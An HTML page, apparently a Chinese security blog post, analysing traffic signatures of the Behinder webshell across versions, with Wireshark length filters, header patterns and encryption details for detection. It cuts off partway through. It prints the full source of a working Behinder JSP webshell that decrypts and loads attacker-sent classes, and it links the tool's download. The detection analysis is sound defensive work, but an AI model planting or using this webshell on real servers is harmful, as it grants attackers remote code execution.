@@ -1,0 +1,1038 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/url.jpg">
+  <link rel="icon" href="/img/url.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="J_0k3r">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="轻俏地擦著了电流 今晚后不只跟你是朋友 -《温室效应》">
+<meta property="og:type" content="article">
+<meta property="og:title" content="冰蝎webshell流量特征">
+<meta property="og:url" content="http://example.com/2025/12/07/%E5%86%B0%E8%9D%8E/index.html">
+<meta property="og:site_name" content="J_0k3r">
+<meta property="og:description" content="轻俏地擦著了电流 今晚后不只跟你是朋友 -《温室效应》">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/ddhr.jpg">
+<meta property="article:published_time" content="2025-12-07T05:14:52.000Z">
+<meta property="article:modified_time" content="2025-12-14T08:05:39.874Z">
+<meta property="article:author" content="J_0k3r">
+<meta property="article:tag" content="笔记">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/ddhr.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>冰蝎webshell流量特征 - J_0k3r</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":180,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"python"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"41fc030db57d5570dd22f78997dc4a7e","google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":true},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?41fc030db57d5570dd22f78997dc4a7e";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>J_0k3r的无人之境</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/playlist/" target="_self">
+                <i class="iconfont icon-music"></i>
+                <span>音乐</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/wsxy.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="冰蝎webshell流量特征"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        J_0k3r
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-12-07 13:14" pubdate>
+          2025年12月7日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          60 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">冰蝎webshell流量特征</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年12月14日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h3 id="payload长度特征"><a href="#payload长度特征" class="headerlink" title="payload长度特征"></a>payload长度特征</h3><p>webshell连接后必定会发送一个获取基本信息的包</p>
+<p>对同样的数据使用不同的key用同样的aes加密/xor加密后再base64编码后的长度是一样的。</p>
+<p>同版本的冰蝎在首次连接shell时发送的payload是一样的，可以通过长度来判断是否是冰蝎流量。</p>
+<h4 id="shell-php"><a href="#shell-php" class="headerlink" title="shell.php"></a>shell.php</h4><p>首次连接shell都会有一个<code>phpinfo()</code>的请求并且payload是一样的，并且即使每次的aes的key不同，其用同一种aes模式加密后的长度是一样的</p>
+<h6 id="v1-x"><a href="#v1-x" class="headerlink" title="v1.x"></a>v1.x</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//wireshark中过滤</span><br>http.content_length == <span class="hljs-number">1624</span>  <span class="hljs-comment">//请求body长度</span><br>frame.len == <span class="hljs-number">1668</span>  <span class="hljs-comment">//帧长度</span><br><span class="hljs-comment">//header</span><br>Connection: keep-alive<br>Content-Length: <span class="hljs-number">1624</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/behinder/1765520328710-823a1e7b-fa96-4131-b7de-0b8ff7a027af.png" srcset="/img/loading.gif" lazyload></p>
+<h6 id="v2-x"><a href="#v2-x" class="headerlink" title="v2.x"></a>v2.x</h6><p>首次连接webshell固定发送两个payload，第一个是探测是否有openssl扩展，第二个是<code>phpinfo()</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//wireshark aes</span><br>frame.len == <span class="hljs-number">1156</span> || frame.len == <span class="hljs-number">2264</span><br>http.content_length == <span class="hljs-number">1112</span> ||http.content_length == <span class="hljs-number">2220</span><br><span class="hljs-comment">//header  aes</span><br>Connection: keep-alive<br>Content-Length: <span class="hljs-number">1112</span><br>Connection: keep-alive<br>Content-Length: <span class="hljs-number">2220</span><br><br><span class="hljs-comment">//wireshark  xor</span><br>frame.len == <span class="hljs-number">1156</span> || frame.len == <span class="hljs-number">2256</span><br>http.content_length == <span class="hljs-number">1112</span> ||http.content_length == <span class="hljs-number">2212</span><br><span class="hljs-comment">//header  xor</span><br>Connection: keep-alive<br>Content-Length: <span class="hljs-number">1112</span><br>Connection: keep-alive<br>Content-Length: <span class="hljs-number">2212</span><br></code></pre></td></tr></table></figure>
+
+<p>openssl开启下</p>
+<p><img src="/mdimg/behinder/1765522113324-b1f556b4-bdf4-40c3-ab38-a65f010ce2c1.png" srcset="/img/loading.gif" lazyload></p>
+<p>openssl关闭使用xor</p>
+<p><img src="/mdimg/behinder/1765522536176-45ccd589-307d-463d-92f1-12aa6dcae8d7.png" srcset="/img/loading.gif" lazyload></p>
+<h6 id="v3-x"><a href="#v3-x" class="headerlink" title="v3.x"></a>v3.x</h6><p>开启openssl时，首次连接webshell，请求长度是动态的，无法预测</p>
+<p><img src="/mdimg/behinder/1765523137427-eeb032c2-81d7-45af-ada1-b8dd00f52569.png" srcset="/img/loading.gif" lazyload></p>
+<p>不支持openssl使用xor时，请求长度也是动态的</p>
+<p><img src="/mdimg/behinder/1765692539620-af042618-5fe8-4fa9-b995-749b40ff050d.png" srcset="/img/loading.gif" lazyload></p>
+<h6 id="v4-x"><a href="#v4-x" class="headerlink" title="v4.x"></a>v4.x</h6><p>同v3.x，首次连接shell的请求长度是动态的</p>
+<h4 id="shell-jsp"><a href="#shell-jsp" class="headerlink" title="shell.jsp"></a>shell.jsp</h4><h6 id="v1-x-1"><a href="#v1-x-1" class="headerlink" title="v1.x"></a>v1.x</h6><p>连接webshell后，先get获取key后请求获取基本信息，使用相同payload，长度固定</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//wireshark中过滤</span><br>http.content_length == <span class="hljs-number">8556</span>  <span class="hljs-comment">//请求body长度</span><br>frame.len == <span class="hljs-number">8600</span>  <span class="hljs-comment">//帧长度</span><br><span class="hljs-comment">//header</span><br>Connection: keep-alive<br>Content-Length: <span class="hljs-number">8556</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/behinder/1765694841038-50f239f1-d544-4112-9b54-ee7f4d13165b.png" srcset="/img/loading.gif" lazyload></p>
+<h6 id="v2-x-1"><a href="#v2-x-1" class="headerlink" title="v2.x"></a>v2.x</h6><p>连接webshell后，先两次get获取key后请求获取基本信息，使用相同payload，长度固定,与v1.x用相同的payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//wireshark中过滤</span><br>http.content_length == <span class="hljs-number">8556</span>  <span class="hljs-comment">//请求body长度</span><br>frame.len == <span class="hljs-number">8600</span>  <span class="hljs-comment">//帧长度</span><br><span class="hljs-comment">//header</span><br>Connection: keep-alive<br>Content-Length: <span class="hljs-number">8556</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/behinder/1765695179169-7741c614-b433-465e-92be-1d6b9ecfc3f7.png" srcset="/img/loading.gif" lazyload></p>
+<h6 id="v3-x-1"><a href="#v3-x-1" class="headerlink" title="v3.x"></a>v3.x</h6><p>首次连接请求获取基本信息的长度是动态的</p>
+<p><img src="/mdimg/behinder/1765694671016-7775b785-b2f3-4e70-8d21-4a24fa2f7610.png" srcset="/img/loading.gif" lazyload></p>
+<h6 id="v4-x-1"><a href="#v4-x-1" class="headerlink" title="v4.x"></a>v4.x</h6><p>同v3.x，首次连接shell的请求长度是动态的</p>
+<h4 id="shell-aspx"><a href="#shell-aspx" class="headerlink" title="shell.aspx"></a>shell.aspx</h4><h6 id="v1-x-2"><a href="#v1-x-2" class="headerlink" title="v1.x"></a>v1.x</h6><p>连接webshell后，先get获取key后请求获取基本信息，使用相同payload，长度固定</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//wireshark中过滤</span><br>http.content_length == <span class="hljs-number">7184</span>  <span class="hljs-comment">//请求body长度</span><br>frame.len == <span class="hljs-number">7228</span>  <span class="hljs-comment">//帧长度</span><br><span class="hljs-comment">//header</span><br>Connection: keep-alive<br>Content-Length: <span class="hljs-number">7184</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/behinder/1765695630072-0f31a0bf-c001-4974-b290-063408516dcf.png" srcset="/img/loading.gif" lazyload></p>
+<h6 id="v2-x-2"><a href="#v2-x-2" class="headerlink" title="v2.x"></a>v2.x</h6><p>连接webshell后，先两次get获取key后请求获取基本信息，使用相同payload，长度固定</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//wireshark中过滤</span><br>http.content_length == <span class="hljs-number">7184</span>  <span class="hljs-comment">//请求body长度</span><br>frame.len == <span class="hljs-number">7228</span>  <span class="hljs-comment">//帧长度</span><br><span class="hljs-comment">//header</span><br>Connection: keep-alive<br>Content-Length: <span class="hljs-number">7184</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/behinder/1765695789497-f8b6f793-b10b-4ca8-81ce-71ad00f7247c.png" srcset="/img/loading.gif" lazyload></p>
+<h6 id="v3-x-2"><a href="#v3-x-2" class="headerlink" title="v3.x"></a>v3.x</h6><p>首次连接请求获取基本信息的长度是动态的</p>
+<p><img src="/mdimg/behinder/1765695913635-e847bbc0-4ae1-470e-b0d4-56dc58633bb5.png" srcset="/img/loading.gif" lazyload></p>
+<h6 id="v4-x-2"><a href="#v4-x-2" class="headerlink" title="v4.x"></a>v4.x</h6><p>同v3.x，首次连接shell的请求长度是动态的</p>
+<h3 id="v1-x-3"><a href="#v1-x-3" class="headerlink" title="v1.x"></a>v1.x</h3><p>能够推断是webshell的条件</p>
+<ul>
+<li>通过第一个获取key的请求<code>/shell.jsp?pass=xxx</code>然后返回k值（16位）</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">shell.jsp?pass=xxx   <span class="hljs-comment">//AES-128-ECB 无 IV</span><br>shell.php?pass=xxx   <span class="hljs-comment">//AES-128-CBC  全零（16进制32个0） IV</span><br>shell.aspx?pass=xxx  <span class="hljs-comment">//AES-128-CBC  key = IV</span><br>shell.jspx?pass=xxx   <span class="hljs-comment">//AES-128-ECB 无 IV</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>这个请求之后的请求header是：</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Content-Type: application/octet-stream   <br>Pragma: no-cache<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>可以用返回的key解密请求和响应，解密成功100%确定，不超过则不是。</li>
+<li>首次连接webshell获取系统信息的请求包长度判断</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">shell.php    <span class="hljs-comment">//Content-Length: 1624</span><br>shell.jsp    <span class="hljs-comment">//Content-Length: 8556</span><br>shell.aspx   <span class="hljs-comment">//Content-Length: 7184</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="v2-x-3"><a href="#v2-x-3" class="headerlink" title="v2.x"></a>v2.x</h3><p>够推断是webshell的条件</p>
+<ul>
+<li>两个获取key的请求成对出现，然后返回k值（16位） <font style="color:#DF2A3F;">//两次请求是冰蝎v2.x的特征</font></li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">shell.jsp?pass=xxx   <span class="hljs-comment">//AES-128-ECB 无 IV</span><br>shell.php?pass=xxx   <span class="hljs-comment">//AES-128-CBC 全零(16进制32个0)IV 或者xor加解密</span><br>shell.aspx?pass=xxx  <span class="hljs-comment">//AES-128-CBC  key = IV</span><br>shell.asp?pass=xxx   <span class="hljs-comment">//xor加解密</span><br>shell.jspx?pass=xxx  <span class="hljs-comment">//AES-128-ECB 无 IV</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>这两个请求之后的请求header是：</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Content-Type: application/octet-stream   <span class="hljs-comment">//java环境/IIS</span><br>Content-Type: application/x-www-form-urlencoded   <span class="hljs-comment">//php环境</span><br>Pragma: no-cache<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>可以用成对获取key的第二个请求返回的key解密请求和响应，解密成功100%确定，不超过则不是。</li>
+<li>首次连接webshell获取系统信息的请求包长度判断</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">shell.php    <span class="hljs-comment">//Content-Length: 1112 &amp;&amp; Content-Length: 2220  aes</span><br>shell.php    <span class="hljs-comment">//Content-Length: 1112 &amp;&amp; Content-Length: 2212  xor</span><br>shell.jsp    <span class="hljs-comment">//Content-Length: 8556</span><br>shell.aspx   <span class="hljs-comment">//Content-Length: 7184</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="v3-x-3"><a href="#v3-x-3" class="headerlink" title="v3.x"></a>v3.x</h3><p>够推断是webshell的条件，v3.x最大的特征是key固定，没有了key请求</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">shell.jsp    <span class="hljs-comment">//AES-128-ECB 无 IV，key固定</span><br>shell.php   <span class="hljs-comment">//AES-128-CBC 全零(16进制32个0)IV 或者xor加解密 key固定</span><br>shell.aspx  <span class="hljs-comment">//AES-128-CBC  key = IV key固定</span><br>shell.asp   <span class="hljs-comment">//xor加解密 key固定</span><br>shell.jspx  <span class="hljs-comment">//AES-128-ECB 无 IV key固定</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>header是（辅助判断）</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Content-Type: application/octet-stream   <span class="hljs-comment">//java环境/IIS</span><br>Content-Type: application/x-www-form-urlencoded   <span class="hljs-comment">//php环境</span><br>Pragma: no-cache<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>可以用默认key尝试解密请求和响应，解密成功100%确认。解密不超过则不能确定。</li>
+</ul>
+<h3 id="v4-x-3"><a href="#v4-x-3" class="headerlink" title="v4.x"></a>v4.x</h3><p>够推断是webshell的条件，v4.x默认情况下和v3.x一样，但允许自定义加解密</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">shell.jsp    <span class="hljs-comment">//AES-128-ECB 无 IV，key固定</span><br>shell.php   <span class="hljs-comment">//AES-128-CBC 全零(16进制32个0)IV 或者xor加解密 key固定</span><br>shell.aspx  <span class="hljs-comment">//AES-128-CBC  key = IV key固定</span><br>shell.ashx  <span class="hljs-comment">//AES-128-CBC  key = IV key固定</span><br>shell.asp   <span class="hljs-comment">//xor加解密 key固定</span><br>shell.jspx  <span class="hljs-comment">//AES-128-ECB 无 IV key固定</span><br><br><span class="hljs-comment">//使用预设的自定义传输协议，特征较明显</span><br>default_image  伪造成图片数据传输，就是在content后拼接payload （特征）<br>default_json   伪造成json传输，在json后面拼接payload          （特征）<br>aes_with_magic  AES-<span class="hljs-number">128</span> ECB  无IV但是在尾部拼接随机magicNum    （特征）<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>header是（辅助判断）</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Content-Type: application/octet-stream   <span class="hljs-comment">//java环境/IIS</span><br>Content-Type: application/x-www-form-urlencoded   <span class="hljs-comment">//php环境</span><br>Pragma: no-cache<br>Cache-Control: no-cache<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>可以用默认key尝试解密请求和响应，解密成功100%确认。解密不成功则不能确定。</li>
+</ul>
+<h1 id="V1-x"><a href="#V1-x" class="headerlink" title="V1.x"></a>V1.x</h1><p><a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder/releases/download/Behinder_v1.2.1/Behinder_v1.2.1.zip">https://github.com/rebeyond/Behinder/releases/download/Behinder_v1.2.1/Behinder_v1.2.1.zip</a></p>
+<p><img src="/mdimg/behinder/1765349639082-393c2180-86af-4016-a446-44ff583cf5e6.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>V1.2.1</code>的ua也是随机的</p>
+<p>环境：windows11+tomcat9+jdk1.8</p>
+<p>shell.jsp</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%<span class="hljs-meta">@page</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;&lt;%!<span class="hljs-keyword">class</span> <span class="hljs-title class_">U</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span>&#123;U(ClassLoader c)&#123;<span class="hljs-built_in">super</span>(c);&#125;<span class="hljs-keyword">public</span> Class <span class="hljs-title function_">g</span><span class="hljs-params">(<span class="hljs-type">byte</span> []b)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.defineClass(b,<span class="hljs-number">0</span>,b.length);&#125;&#125;%&gt;&lt;%<span class="hljs-keyword">if</span>(request.getParameter(<span class="hljs-string">&quot;pass&quot;</span>)!=<span class="hljs-literal">null</span>)&#123;String k=(<span class="hljs-string">&quot;&quot;</span>+UUID.randomUUID()).replace(<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).substring(<span class="hljs-number">16</span>);session.putValue(<span class="hljs-string">&quot;u&quot;</span>,k);out.print(k);<span class="hljs-keyword">return</span>;&#125;Cipher c=Cipher.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);c.init(<span class="hljs-number">2</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>((session.getValue(<span class="hljs-string">&quot;u&quot;</span>)+<span class="hljs-string">&quot;&quot;</span>).getBytes(),<span class="hljs-string">&quot;AES&quot;</span>));<span class="hljs-keyword">new</span> <span class="hljs-title class_">U</span>(<span class="hljs-built_in">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&gt;<br></code></pre></td></tr></table></figure>
+
+<p>在</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%<br><span class="hljs-keyword">if</span>(request.getParameter(<span class="hljs-string">&quot;pass&quot;</span>)!=<span class="hljs-literal">null</span>)&#123;<br>    String k=(<span class="hljs-string">&quot;&quot;</span>+UUID.randomUUID()).replace(<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).substring(<span class="hljs-number">16</span>);<br>    session.putValue(<span class="hljs-string">&quot;u&quot;</span>,k);<br>    out.print(k);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>会返回一个随机的K值，然后写入session<code>u=k的值</code></p>
+<p>所以webshell连接的第一个请求肯定是<code>/shell.jsp?pass=xxx</code>然后返回k值（16位）</p>
+<p><img src="/mdimg/behinder/1765266427283-cdc2c65c-9df8-4d57-a962-825d6638a4cc.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后对于后续请求</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">Cipher c=Cipher.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);<br>c.init(<span class="hljs-number">2</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>((session.getValue(<span class="hljs-string">&quot;u&quot;</span>)+<span class="hljs-string">&quot;&quot;</span>).getBytes(),<span class="hljs-string">&quot;AES&quot;</span>));<br><span class="hljs-comment">//使用的是 AES 默认模式（ECB），且无 IV</span><br><br><span class="hljs-keyword">new</span> <span class="hljs-title 